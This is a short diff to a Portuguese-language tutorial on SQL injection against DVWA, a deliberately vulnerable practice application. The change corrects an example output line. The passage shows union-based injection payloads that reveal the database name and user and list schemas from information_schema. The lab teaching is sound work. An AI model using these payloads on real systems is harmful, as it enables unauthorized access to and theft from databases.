@@ -89,7 +89,7 @@ SQL Injection (SQLi) é uma vulnerabilidade que permite a um atacante “injetar
    
    ID: 1' union select database(), user() --'
    First name: dvwa
-   Surname: 0
+   Surname: root@localhost
    ```
  Da resposta, extraímos que o banco de dados é o "dvwa".
  * Para obter a lista com os bancos de dados, injetamos `1' union select schema_name, 2 from information_schema.schemata -- '`.
